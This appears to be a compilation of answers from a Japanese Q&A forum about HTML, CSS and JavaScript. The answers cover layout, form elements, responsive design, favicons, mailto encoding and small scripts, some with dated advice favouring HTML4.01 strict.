rel="SHORTCUT ICON" href="/favicon.ico"> <link rel="ICON" href="/favicon.ico"> </head> で書いていく。 　これで、基本的にはブラウザ間の差異はほとんどないはずです。 もちろん、HTMLには文書構造しか書きませんし、プレゼンテーションはすべてスタイルシートになります。現在のWeb標準は、HTML4.01strict + CSS2.1 と考えてよいでしょう。 1) プレゼンテーション的な指定はHTMLでは行わない。構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )は基本ですけど・・ 　ただし折角その文書定義で記述しても互換モードでブラウザが解釈すれば意味ないですから、きちんと「DOCTYE スイッチ」を指定しておく。(上記ソースはそうなっています。) 　例えば、 ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　[表示]メニューから[スタイル(シート)]へ進んでいろいろなデザインを選択してみても、IE９以降とfirefox3.5,4に差はないはずです。もちろんChromeには代替スタイルシートを利用できません。タブレットやスマホ用のブラウザも基本的には代替スタイルシートは利用できない。 Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　で確認してごらんなさい。 　HTML5やCSS3への対応ですが、HTML5はjavascript(html5.js)で対処して、CSS3はそれが効かなくでも良いように記述していけばよいです。 　なお、段組みにfloatを使ってはならないとか・
>なので、特にCCとBCCの設定は外しても構わないですね。 To:、Cc:、Bcc:のそれぞれの用途を理解しているのならば…ですが。 # で、ソレはHTMLの領域ではない。
スタイルシート部分 全くチンプンカンプンだと思います。 div.section div.section p.Main img{ max-width:50%; height:auto; } と div.section div.section p.Main img{ display:block; width:100%; max-width:100%; height:auto; } が画像のサイズを指定している部分ですが、 div.section div.section p.Main img{ は、半角スペースで区切られていますから、sectionクラスのdiv要素中のsectionクラスのdiv要素中のMainクラスの段落中の画像要素という意味で、セレクタと呼ばれる部分です。ここで具体的にどの要素にスタイルを指定するかが決まる。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティー値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　CSSで最も重要な部分です。 <style type="text/css"> <!-- body{background-color:gray;} div.header{background-color:aqua;} div.section{background-color:silver;} div.section div.section{background-color:white;} div.nav{background-color:lime;} div.aside{background-color:yellow;} div.footer{background-color:fuchsia;} html,body,h1,h2,h3,h2,p{margin:0;padding:0;line-height:1.8em;} ol{margin:0 2em;} --> </screen> <style type="text/css" media="screen" > <!-- div.header, div.section, div.footer{ width:90%; min-width:640px;max-width:1000px; margin:0 auto; } div.section{ position:relative; min-height:800px; } div.section h2, div.section div.section{ margin:0 215px; } div.section div.section{ width:auto; min-width:0; min-height:300px; } div.section div.nav, div.section div.aside{ position:absolute; top:0; width:200px; height:100%; } div.section div.nav{ left:0; } div.section div.aside{ right:0; } div.section div.section p.Main{ text-align:center; position:relative; } div.section div.section{ clear:both; } div.section div.section p.Main img{ max-width:50%; height:auto; } div.section div.section p img{ display:block; float:left; margin:5px; } --> </style> <style type="text/css" media="screen and (max-width:640px)" > <!-- div.header, div.section, div.footer{ width:100%; min-width:320px; } div.section{ position:relative; min-height:400px; } div.section h2, div.section div.section{ margin:0; } div.section div.section{ width:auto; min-width:0; min-height:300px; } div.section div.nav, div.section div.aside{ position:static; width:auto; height:auto; } div.section div.section p.Main img{ display:block; width:100%; max-width:100%; height:auto; } div.section div.section p img{ display:block; float:left; margin:5px; } --> </style>
まずは、タグや属性を覚える事です。 <a>タグは何をするものか、<a href="">　hrefは何をする属性なのか、<a>タグには他にどのような属性があるのか。 また、style属性にはどんな物があるのか、「"color:red;"」とは？　どのタグで有効か？などです。 ＞どうやって勉強していったらいいでしょうか？ まずは、実際にホームページを作っていくのが良いと思います。 無料のレンタルサーバーなどを借りて、ご自身のホームページを作成してみては？ また、私も利用していますが、 「とほほのWWW入門」 http://www.tohoho-web.com/www.htm などを参考にされると良いと思います。 ＞そういうプロのレベルだとどのくらいのことが 例えば、HTMLと言っても「HTML4」や「HTML5」などのバージョンがあります。 CSSも「CSS2.1」「CSS3」などのバージョンがあります。 これらのバージョンで何が変わったのかなどを知っておく必要があると思います。 また、表示はブラウザに内蔵されている「レンダリングエンジン」によって異なります。 IEが採用している「Trident （トライデント）」※実際のIEはTridentを自社用に改変している。 Google Chromeなどが採用している「Blink（ブリンク）」※元々は「WebKit」だった。 FireFoxなどが採用している「Gecko（ゲッコー）」 Safariなどが採用している「WebKit（ウェブキット）」 主に使用されているものを列挙したが、これらで表示した場合に同じHTMLとCSSを使っても同じ表示内容にならない。 なので、それらにどう対応するか？ また、上記の※で少しだけ記述しているが、ブラウザのバージョンによっても表示が異なるのでどこまで対応するのか？ 少なくともこれ位の知識は必要になると思います。
もっと徹底的に削って、 <html> <body> <a href="back.html"> <img src="images/auto/back.png"></a> </body> </html> でリンクがきくか試してみて、きくようなら徐々に仕様を追加して どこでリンクがきかなくなるかチェックすればよいのでは？
張り付けたら、すぐ右下に選択アイコンが出ているはずなので、テキストのみコピーを選択すればよい。 wordのバージョンによって、様々ですが、張り付けた後でCtrキーで選択できたり・・・ 1) 張り付けたい場所で右クリックすると、張り付け前にメニューが出てきたり---Word2013とか 2) Ctrl+Vで張り付けた後、再度Ctrlを押すとメニューが出てきた 3) 張り付ける場所で右クリックから張り付けたら、すぐ右下にメニューが出てきたり ・・・ 　いろいろな方法がありますので、あなたのWordのバージョンあるいは、目的によって使い分けるとよい
if (y<=Math.min(a,b,c) && Math.max(a,b,c)<=z ){ ちなみにevalはよほどのことがない限りつかわないこと 今回のケースならparseFloatで十分 全体的に書き方が古い・・・参考書が古くない？
アクセスできないとはどういう状態なのでしょうか？ エラーが表示される？いくら待っても読み込み中？読み込みおわるけど画面が真っ白？ たとえばF12キーをおしてデバッグしてみるとか・・・ また何らかの理由でproxyが設定されているとかありませんか？
何のためにlabel要素が要るのかわからないです。 type="text","textarea""checkbox","radio","select"などラベルを持たないコントロールにラベルを付けるためのものですよ。 　HTMLはプレゼンテーションのためにマークアップするものではない。 誤り:input type="submit"にはlabelは使わない。 labelを外に出せばよい。 <input type="text" name="name" id="firstName"><label for="firstName"><img src="" width="" height="" alt=""></label> ★ もちろん、このimageがlabelですから alt属性には必ず代替テキストが必要 　そもそも、何をされたいかわかりませんが、基礎的な部分を誤解されているように感じます。 単純に、 <button name="submit" value="送る" type="submit"> 送る<img src="/icons/wow.gif" alt="ナイス"></button> で、すべて解決するはずですが・・・・。button要素は内容を持ちますので、スタイルシートで疑似クラスを併用してcontent:プロパティで内容の追加もできますし。
スタイルシートはともかくjavascript(Jqueryを含む)は使うべきではないです。またあまりユーザーインターフェースを変更するのは好ましくありません。 BUTTON要素が生成するボタンとINPUT要素が生成するボタンは、機能的には同等だが、 BUTTON要素の方がレンダリング能力が高い。 BUTTON要素は内容を持てる。例えば、画像を内容に持つBUTTON要素の機能は、type属性が"image"のINPUT要素とそっくり同じだが、BUTTON要素型は内容を持てるのだ。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) <form action=""> 　<button name="submit" value="送る" type="submit">送る<img src="/icons/wow.gif" alt="送る"></button> </form> BUTTON要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) <input type="image" src="/icons/wow.gif" alt="送信" name="submit" value="送信"> でもよいのですが、クリックした画像の座標も送信されます。スタイルシートでスプライト画像の一部分を利用することも可能です。
No.1さんの言うとおり、myFormオブジェクトが設定されていないので、動作しません。 以下のように、オブジェクトを取得する事で正常に動作します。 （Chrome バージョン 47.0.2526.106 mにて動作確認） var inpUserId = document.getElementById("txt_user_id").value; var inpPassword = document.getElementById("txt_password").value; var myForm = document.getElementById("myForm");　←これを追加。
AMP HTML（AMP(Accelerated Mobile Pages) HTML）とは、Googleがモバイル端末でのブラウザの表示速度を高速化する為に作成したHTML仕様です。 https://googleblog.blogspot.jp/2015/10/introduci … スマホやタブレット等のモバイル端末用のウェブサイトはリッチになりましたが、その分重く、表示に時間がかかるようになった事から高速表示が可能なAMP HTMLを作成しました。
こんにちは。 2つ考えてみました。 ■■その１■■ 高さを揃えるのにjQueryを使ってみました。 本体は別途読み込んでください。 【HTML】 jQueryをわかりやすくするためクラスをつけましたが、そのあたりは適宜対応してください。 <div> <span class="box1" style="background-image:url('test.jpg');"></span> <section class="box2"> <h2>テスト</h2> <p>テストです</p> </section> </div> 【CSS】変更なし 【jQuery】 <script> $(function(){ var boxHeight2 = $(".box2").height(); $(".box1").height(boxHeight2); }); </script> 説明：.box1に.box2の高さを適用する ----- これでできるはずです。 widthを％指定しているので.box2の高さは変動するものと思うので、CSSをいろいろと使うよりはjQueryが小回りも効くし簡単だと思います。 ほかに、右と左で高さの高い方に揃えると言った場合などもif条件分岐で可能です。 ＞出来る事はまず可能なのですか？ とのことでしたので、jQueryであれば余裕で柔軟に対応は可能です。 ------------------------------ ■■その２■■ もし、HTMLを変えて良いなら、妙なspanで画像エリアを作らなくても、span部分削除とCSSだけでもできると思います。 ただし、この場合、ウィンドウサイズ幅が小さくなった時に、画像のアスペクト比によっては画像の下部が空いてしまう場合はあるので、画像の用意で対応か、CSSでmin-widthを設定するなどで対応が必要です。 【HTML】 span部分を削除し、divの左側50％に背景を指定する方法です。 jQueryよりは若干融通が効かなくなりますが、ソースがシンプルになるので良いと思います。 <div class="box3" style="background-image:url('test.jpg');"> <section> <h2>テスト</h2> <p>テストです</p> </section> </div> 【CSS】 .box3{ width: 80%; min-width: 300px;/*適宜*/ box-sizing: border-box; padding-left: 50%; background-repeat: no-repeat; background-size: 50% auto; } これ以外のCSSは背景色指定以外は削除で、同じ表示ができると思います。 頑張ってください。
回答がないみたいなので、40代ではありませんが・・・ googleサイトにアップするのではなく、自サイトに画像データを置いてブラウザで表示したいという意味でしょうか？ sphereそのものを扱ったことがないので、ちょこっと調べてみただけですが、可能みたいですね。 一つはgoogleのapiを利用して、画像データをカスタムに指定してあげる方法。 説明は以下。（下の方の「Providing Custom Street View Panoramas」あたり） https://developers.google.com/maps/documentation … サンプルが以下。 https://developers.google.com/maps/documentation … ローカルで試してみたところ表示できるようですが、動かしてみたら、すぐに「keyが違う！」と怒られましたので、サイトkeyを取得しておく必要がありそうです。（一応、動きました） googleのapiリファレンスは以下。 https://developers.google.com/maps/documentation … 一方で、sphereの単独のビューアーを作成している方もいらっしゃるようです。 以下はその紹介ページ http://mistic100.github.io/Photo-Sphere-Viewer/ こちらは試してはいませんが、「WebGLに対応していないブラウザには、Three.jsも必要」みたいなことが書いてあるようですね。 実際のスクリプトの作者のページはこちらです。 http://jeremyheleine.me/photo-sphere-viewer/ ドキュメンテーションは以下にあります。 http://jeremyheleine.me/photo-sphere-viewer/doc/ … ※ 調べている途中で、似たようなものを他にも見かけましたので、検索してみればもっと他にも見つかると思います。
１． もしかしたら、入力モードが日本語とか。半角にしてCtrl+/してみてもダメですか。 ２． 何の言語でしょうか？言語に応じてコメントアウトは記述が違います。そのあたりの認識をさせてますでしょうか？ つまり、htmlなら、拡張子.html等で一度ファイルを保存してるファイルでしょうか？新規ファイルなら、右下に「Plain Text」などと書かれた場所がありますので、そこをクリックして適切な形式を選ばれてから、Ctrl+/してみてください。 ぱっと思いつくのはそれくらいです。
javaではなく、javacriptを使用します。javaとjavascriptは全く別物です。 ただ、javascriptはクライアント側での処理になりますから、最近のように、セキュリティでjavascriptを禁止している訪問者には使えませんし、ユーザーエージェントの時計がずれていたら使えない。 　そのために、正確に行おうとしたらYahoo!オークションの「詳細な残り時間」のように、サーバー側のシステムと連動させないとならないでしょう。小窓をjavascriptで開き、そこに再読み込み時間をしていたページを開く <meta http-equiv="Refresh" content=";URL=">
ストリームサーバーに直接アクセスすればできるが、何のサービスかわからないので、できるかもしれないしできないかもしれない。
> 少なくとも命題にある行結合した該当行が通常の２倍になるような表はできない できますけど…。 <!DOCTYPE html> <html> <head> <style type="text/css"> table,td{ border-style:solid; border-width:1px; border-collapse:collapse; width:100px; } tr{ height:5px } </style> </head> <body> <table> <tr><td></td></tr> <tr><td rowspan="2"></td></tr> <tr></tr> <tr><td></td></tr> </table> </body> </html>
aaa.comは、IPアドレスではなく、ドメインです。 【特定のドメインを拒否】 order allow,deny allow from all deny from aaa.com
元々，RFC2368 ( http://www.ietf.org/rfc/rfc2368.txt ) の定義では，mailtoスキームのbodyとしてencoded wordを含めることができませんでした。 RFC6068 ( http://www.ietf.org/rfc/rfc6068.txt ) の定義で，ようやくUTF-8でのパーセントエンコーディングが許されましたが， ・ブラウザがこれに対応している ・メールクライアントがこれに対応している の2つが必要になります。 仕様としてHTML 4.01ではmailtoプロトコルに対して動作は未定義とされていて，HTML 5でちゃんと定義されました。 http://www.w3.org/TR/html4/interact/forms.html#a … http://www.w3.org/TR/html5/forms.html#submit-mai … とはいえ，RFC 6068は2010年制定のため，以前との互換性維持のためにブラウザにしろメールクライアントにしろ，bodyをShift_JISとして解釈している可能性もあります。 現実的には，US-ASCII以外を受け付ける物にmailtoスキームを使うのは難しいと思います。
念のため２種類の指定をしています。 <link rel="SHORTCUT ICON" href="/favicon.ico"> <link rel="ICON" href="/favicon.ico"> アイコンファイルの標準的な拡張子は.icoです。 複数のサイズのアイコンを一つのファイルにしてあります。 上記例では、ルートに置いてありますので特にこの指定をしなくてもブラウザがルートにあるアイコン(favicon.ico)は見つけてくれますから、HTMLで指定する必要もないはずです。 Favicon - Wikipedia( https://ja.wikipedia.org/wiki/Favicon )
少々アレンジを入れて <!DOCTYPE html><meta charset=utf-8><title>ゲームの集計表</title> <style> table.score { border-collapse:collapse; } table.score tr>* { padding:0.2ex 0.5ex; } table.score tr>*:nth-child(even), table.score tr:nth-child(even)>td { background-color:#ffffdd; } table.score tr:nth-child(even)>td:nth-child(even) { background-color:#ffffcc; } table.score td.num { text-align:right; } table.score input[type=number] { text-align:right; width:4em; background-color:inherit; border:0;} </style> <script>window.addEventListener('DOMContentLoaded', function(){_=0; _ ; var W = window, D = W.document, NC = {className:'num'}; _ ; var A = function(a,i){return Array.prototype.slice.call(a,i?i:0)}; _ ; var R = function(d,s){for(var i in s)d[i]=s[i]; return d}; _ ; var E = function(n,_){var e=(typeof n=='string')?D.createElement(n):n; A(arguments,1).forEach(appendVariousChild.bind(null,e)); return e}; _ ; var Q = function(p,s){return (p?p:D).querySelector(s)}; _ ; var QQ = function(p,s){return A((p?p:D).querySelectorAll(s))}; _ ; var C = function(p,s){var e=p; do { e=e.parentNode; } while (e && e.tagName!=s.toUpperCase()); return e}; _ ; var N = function(n){return (n===0?'':n<0?'':'+') + n.toPrecision(5).replace(/\.?0+$/,'')}; _ ; function appendVariousChild(e,x){ _ , _ ; (x instanceof HTMLElement)? e.appendChild(x): (x instanceof Array)? x.forEach(function(p){appendVariousChild(e,p)}): (typeof x == 'object')? R(e,x): e.appendChild(D.createTextNode(x)); _ ; }; _ ; function makeDataRow(n, members) { _ , _ ; var toi = function(e,i){return E('td', NC, E('input', {type:'number', name:'s'+i, value:''}))}; _ , _ ; return E('tr', E('td', NC, n), members.map(toi), E('td', NC, E('output', {name:'z'}, 0))); _ ; } _ ; function makeSumRow(members) { _ , _ ; var toi = function(e,i){return E('td', NC, {title:e}, E('output', {name:'s'+i}, 0))}; _ , _ ; return E('tr', E('td', '合計'), members.map(toi), E('td', NC, E('output', {name:'z'}, 0))); _ ; } _ ; function checkCell(ie) { _ , _ ; var tab = C(ie, 'table'), tr = C(ie, 'tr'), eq = function(e){return e.name==ie.name}, sum = function(p,e){var n=parseFloat(e.value);return isNaN(n)?p:n+p}; _ , _ ; Q(tr, 'output[name=z]').value = N(QQ(tr, 'input[name^=s]').reduce(sum, 0)); _ , _ ; (QQ(tab, 'tfoot output[name^=s]').filter(eq))[0].value = N(QQ(tab, 'tbody input[name^=s]').filter(eq).reduce(sum, 0)); _ , _ ; Q(tab, 'tfoot output[name=z]').value = N(QQ(tab, 'tfoot output[name^=s]').reduce(sum, 0)); _ ; } _ ; function createBoard(members){ _ , _ ; if (members.length < 2) return; _ , _ ; var tab = E('table', {border:'border', className:'score'}, E('caption', new Date().toLocaleString())); _ , _ ; E(tab, E('thead', E('tr', E('th', '#'), members.map(function(e){return E('th',e)}), E('th','check')))); _ , _ ; E(tab, E('tbody', makeDataRow(1, members)), E('tfoot', makeSumRow(members))); _ , _ ; tab.dataset.members = members.join(' '); _ , _ ; var parent = Q(D.body, '#boards'); _ , _ ; parent.insertBefore(E('form', {name:'p'}, tab, E('button',{type:'submit', name:'a'}, '行追加')), parent.firstChild); _ ; } _ ; function addBoardLine(form) { _ , _ ; var tab = Q(form, 'table'), members = tab.dataset.members.split(/ /), bod = tab.tBodies[0]; _ , _ ; E(bod, makeDataRow(bod.rows.length + 1, members) ); _ ; } _ ; W.addEventListener('submit', function(ev){ _ , _ ; var form = ev.target; _ , _ ; if (form.name == 'c') ev.preventDefault(), createBoard(ev.target.elements['m'].value.split(/\s+/).filter(function(e){return !!e})); _ , _ ; if (form.name == 'p') ev.preventDefault(), addBoardLine(form); _ ; }, false); _ ; W.addEventListener('change', function(ev){ _ , _ ; var t = ev.target; if (t.tagName != 'INPUT') return; _ , _ ; if (/^s/.test(t.name)) ev.preventDefault(), checkCell(t); _ ; }, false); }, false)</script> <h1>ゲームの集計表</h1> <form name=c><input type=text name=m size=40 value="豊臣 早見 織田 明智 徳川"><button type=submit>新規作成</button></form> <article id=boards></article>
＞header("Location:Complete.html");はどこに入れるのでしょうか？ ＞無知で質問ばかりして申し訳ないのですが、回答お願いします。 いや、むしろどうしたいか？でしょう ＞action="Complete.html"の部分を消すとうまく保存される とあるので、うまく保存されたかどうかチェックする何かがあるのですよね？ if(umaku_hozon_dekita()){ header("Location:Complete.html"); } function umaku_hozon_dekita(){ いろいろチェックしてうまく保存できてたら return true; だめなら return false; } うまく保存できたときにはページに飛び、うまくいかなければそのまま表示です。
<style> .block { position:relative; } .block .corner { position:absolute; right:0; top:0; } </style> <section class=block> <aside class=corner>aaaa<br>bbbb<br>cccc</aside> <h1>文字</h1> </section>
＞出力×-1で表示したい。 えーとソースを全く読む気がないということでよろしいですか？ そのままコピペしているなら42行目くらい f.elements["o"+i].value=(f.elements["i"+i].value*100-Math.round(avg*100))/100; の個所を f.elements["o"+i].value=-(f.elements["i"+i].value*100-Math.round(avg*100))/100; にすれば正負逆転します o0~o6のデータを書き換えている箇所なので・・・
今時frameは使いません。 frameは様々な理由で、２０年前1995年のHTML4.01以降非推奨になり、HTML4.01(推奨型)以降使いません。HTML5では存在すらしません。 HTML フレーム 問題 - Google 検索( https://www.google.co.jp/search?q=HTML%20%E3%83% … ) 　どうしても必要ならiframeを使用します。HTML4.01,XHTML1.0,XHTML1.1などでは非推奨ですが、HTML5では復活しましたが、メインコンテンツには使用しないなど気を付けて使用しないと、frameと同じ問題を抱えることになります。 　ましてや、このようにデザインのためにframeを使うのは間違いです。 　おかしな方向に進んでいるようです。ちゃんとした道を歩まないと苦労しますよ。 　この場合は、率直に <body> 　<div class="header"> 　　ヘッダ記事 　　サイト全体のメニューならここが順当 　</div> 　<div class="section"> 　　本文 　　<div class="nav"> 　　　本文の目次 　　</div> 　</div> 　<div class="footer"> 　　この記事のフッタ 　</div> </body> HTML5でしたら <body> 　<header> 　　ヘッダ記事 　</header> 　<section> 　　本文 　　<nav> 　　　本文の目次 　　</nav> 　</section> 　<footer> 　　この記事のフッタ 　</footer> </body> class名は「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」にしたがい、HTML5の文書構造を示す要素に合わせている。 としてスタイルシートでデザインすればよいです。 なお、media="all"はダメです。それだとスクリーンリーダーにも印刷にも展示端末にも適用されてしまう。 ここはmedia="screen"ですよ。携帯電話やプリンターなどには素--デフォルトで利用されます。 サンプル ★タブは＿に置換してある ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATA(右上)で検証済みのHTML401strict+CSS2.1--ウェブ標準 　 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- html,body{margin:0;padding:0;background-color:navy;position:relative;height:100%;padding:50px 100px;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;background-color:white;} div.section{position:relative;} div.section h2,div.section p{margin-left:200px;} div.section div.nav{position:absolute;top:0;left:0;width:180px;background-color:yellow;height:100%} /* aqua、black、blue、fuchsia、gray、green、lime、maroon、navy、olive、orange、purple、red、silver、teal、white、yellow */ --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文は、仕様書に従いsectionのclass名を付けてある。</p> ＿＿<div class="nav"> ＿＿＿<h3>menue</h3> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
yahooを例に見れば、プログラムとしてホームページの設定をするのは もはや行われていない・・・ということが分かると思います http://www.yahoo.co.jp/promotion/startpage/ どうしても必ず最初にみてもらいたいなら上記例をパクってください ただしユーザーの強い希望と自己責任で設定するのだということを 明示しなければ公正とはいえません ちなみに今現在「ホームページ」という用語自体大きく３つ意味があります (1)サイトのトップページ（入口のページ） (2)サイト全体もしくはページひとつひとつ (3)ブラウザを開いたときに最初に表示される画面 その意味では、質問者さんの命題は別に間違っているわけではありません (1)を(3)に設定したいということですよね ただダブルミーニングの用語をさらっと同じ文脈に書くから混乱の元になっています。
こんにちは。 iphoneは使ってないので、単にググっただけですが・・・ マップのソフトなどを利用して現在地を表示したいということでしょうか？ http://www.ipodwave.com/app/googlemaps-current-l … このご質問がHTMLカテなので、HTML(ブラウザ）を利用して表示したいという意味でしょうか？ googleMapのブラウザへの表示は公開されていますので、iphoneの位置情報をブラウザから取得できれば可能ですね。 http://ascii.jp/elem/000/000/433/433470/ （若干情報が古いかもですが、基本的な考え方は変わらないはず） 一方で、正確な位置情報の取得にまだ問題が残っているのかも… http://waox.main.jp/news/?p=1199#more-1199 少し趣は違いますが、こんなのもありました。 http://growthfield.hatenablog.jp/entry/2012/02/2 …
firefoxだと、 Dafizilla Table2Clipboard( https://addons.mozilla.org/ja/firefox/addon/dafi … ) と言うアドオンがあって、tableをそのままexcelに貼りつけられる形でコピーしてくれるのですが・・・ 　領収書/購入履歴　に進んで、全体とか行とか指定して・・ 　excelに貼りつけた後、背景や罫線、文字などを指定しなおすとそのままエクセルとしてつかえる。 &#x5927;&#x578B;&#x985E;&#x4EBA;&#x733F;&#x306E;&#x6A29;&#x5229;&#x5BA3;&#x8A00; 　はご覧になると分かるように、UTFですから、そのままブラウザで表示してコピーしても良いけど 5.3.1 数値文字参照( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
CMSを調べてみたらいかがでしょう? 私は 数式がかける MediaWiki が好きですが、 大規模サイトはJoomlaとかが人気ですね。 htmlやCSSは画面のテーマを決めるとき お仕着せがいやな時に使いますが、後は データベースの内容から画面は動的に生成されます。 画面の内容はwebの編集用画面で編集します。 動的の意味は、画面のデザインをテーマとして分離、 ペ-ジ表示時に、表示内容をテーマに従って整形して 表示するということです。
Outlook 2010の、 「ファイル」タブ ↓ 「オプション」 ↓ 左側の「セキュリティ センター」 ↓ 「Microsoft Outlook セキュリティ センター」の「セキュリティ センターの設定(T)...」 ↓ 左側の「自動ダウンロード」 ↓ 右側のうち、自動ダウンロードを許可したくない項目のチェックを外す
以下でどうでしょうか。 パスワード入力文字が画面1のタイトルになります。 画面２でパスワード未入力 or 右上×で閉じたときなどのエラー処理は考慮していませんので適宜追加してください。 -----form1.hta <!DOCTYPE html> <html> <head> <title>画面1</title> <script type="text/javascript"> function openForm2(){ var ret; ret = showModalDialog("form2.hta",this,'dialogWidth:480px,dialogHeight:120px'); document.title = ret; } </script> </head> <body> <input type="button" onclick='openForm2()' value="画面2を開く"> </body> </html> -----form2.hta <!DOCTYPE html> <html> <head> <title>画面2</title> <script type="text/javascript"> function closeForm2(){ returnValue = document.getElementById("pass").value; this.close(); } </script> </head> <body> Password:<input type="password" id="pass"> <button onclick="closeForm2()">閉じる</button> </body> </html>
ご存知でしたら恐縮ですが、検索エンジンの検索結果上位に自分のサイトが表示されるように工夫することを、「SEO」と言います。 「SEO」でWEB検索してみてください。様々な記事が見付かると思います。 ■ SEOとは - IT用語辞典 http://e-words.jp/w/SEO.html
これはHTMLではなく、「Webデザイン・CSS( https://oshiete.goo.ne.jp/articles/qa/258/ )」の内容ですね。 　レスポンシブウェブデザイン(RWD)の基本はリキッドデザインですよ。HTMLには文書構造だけ記述してスタイルシートでデザインしていく。そして基本は先に言ったようにリキッドです。位置やサイズは絶対値ではなく%で指定していきます。 <body> 　<header> 　　<h1>見出し</h1> 　　<nav> 　　　<ol> 　　　　<li><a href="/"><img src="" width="" height="" alt="TOP"></a></li> 　　　　<li><a href="/books"><img src="" width="" height="" alt="BOOKS"></a></li> 　　　　<li><a href="/help"><img src="" width="" height="" alt="HELP"></a></li> 　　　</ol> 　　</nav> 　</header> 　<section> 　　<section></section> 　　<section></section> 　</section> 　<footer> 　</footer> </body> 　という基本的なHTMLだとして、 header nav ol{list-style-type:none;padding:0;margin:0;text-align:center;} header nav ol li{display:inline-block;width:30%;position:relative;} header nav ol li a{display:block;} header nav ol li a{display:block;width]100%;height:auto;} section{position:relative;} section section{position:absolute;top:0;left:0;width:48%;height:100%;} section section+section{position:static;margin-left:50%;width:48%;} とか・・
入力の項目と表示の項目が一致してないので良いのですか？ > 以下のQ１～Q5までを出発地と、到着地と合わせて、"データを出力する"ことは可能でしょうか？ 各項目のname属性を各々ユニークな値にして、入力と表示で合わせてください。 subWin.document.write("所属："+document.fom.ta.value+"<BR>"); subWin.document.write("ナマエ："+document.fom.tb.value+"<BR>"); subWin.document.write("名前："+document.fom.tc.value+"<BR>"); subWin.document.write("電話："+document.fom.td.value+"<BR>"); subWin.document.write("メール："+document.fom.te.value+"<BR>"); Q1．乗車様の所属<br> <textarea cols="20"　rows="5" name="ta"></textarea><br><br> Q2．乗車様のオナマエ<br> <textarea cols="20"　rows="8" name="tb"></textarea><br><br> Q3．担当者様のお名前<br> <textarea cols="20"　rows="5" name="tc"></textarea><br><br> Q4．担当者様のお電話番号<br> <input type="text" name="td"><br><br> Q5.担当者様のメールアドレス<br> <textarea cols="20"　rows="5" name="te"></textarea><br><br> ※カテゴリはJavaScriptの方が適切かと思います。
No.1です。 TABLEとは表（ひょう）のことです。ここで簡単に説明するのは難しいので参考書で勉強して下さい。 下記のサイトも勉強になると思います。特に「逆引きリファレンス」が役にたつかと思います。 http://www.tohoho-web.com/www.htm
まだ初心者の方のようですから少し詳しく説明すると ＞どのようにHTMLを記述すればよいのでしょうか？ 　そうではありません。HTML5の勧告で今後は益々このあたりは厳しくなりますから、最初に間違って覚えると直すのが大変です。 　実は今から１５年前のHTML4.01の勧告（それ自体、この部分の注意換気が目的でした） 　すなわち、『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』と言われる部分です。 　具体的にはナビゲーションのリストは、その文書構造に基づいてリストとしてマークアップしなさい。ということです。classやidは、HTMLの要素（タグだけでは文書構造が分からないときに）を保管するものです。 　--div要素の「id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 ※a要素内に<p>要素は入れられません。←原因はコレ 　ブロック要素なので、誤ったHTMLとしてここが補完される。 <ul> 　<li><a>バババ<br><span>Ba(Top)</span></a></li> 　<li><a><strong>あああ</strong><br><span>CCC<p>ししし</p></span></a></li> 　<li><a><strong>会社</strong><br><span> Office </span></a></li> </ul> ブラウザで補完すると <ul> 　<li><a>バババ<br><span>Ba(Top)</span></a></li> 　<li><a><strong>あああ</strong><br><span>CCC</span></a> <!-- ここから --> 　</li> </ul> 　<p><a><span>ししし</span></a></p><span></span></a> <!-- ここまで --> </li> <ul> 　<li><a><strong>会社</strong><br><span> Office </span></a></li> </ul> となるのですよ。CSSの検証ページに 『メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。( http://jigsaw.w3.org/css-validator/#validate_by_ … )』 　と書いてある。 [例]ぶんしょこう象しか書かないのでとっても簡単 <div class="header"> 　<ul id="nav"> 　　<li> 　　　<a href="http://www.***.com"><abbr title="Hyper Text Markup Language">HTML</abbr></a> 　　</li> 　　<li> 　　　<a href="http://***.com/index.html"><abbr title="Cascading Style Sheet">CSS</abbr></a> 　　</li> 　　<li> 　　　<a href="http://www.###.com/company.html"><abbr title="Javascript">JS</abbr></a> 　　</li> </ul> 説明 1) headerブロック内にあるので、このナビゲーションはTopnavだと分かる 2) <br>は基本使いません。<span>はclassと併用して文書構造をしめします。 ここはメインの文字の補足だとして<abbr>を使っています。 3) ひたすらシンプルに゛焚書構造だけをHTMLでマークアップします。 [スタイルシート]この文書構造に基づいて記述しますから分かりやすい。 ul#nav{ width:80%; margin:0.5em auto; /*このブロックを中央に配置 */ text-align:center; padding:0; list-style-type:none; line-height:2em;/* 一行の高さ 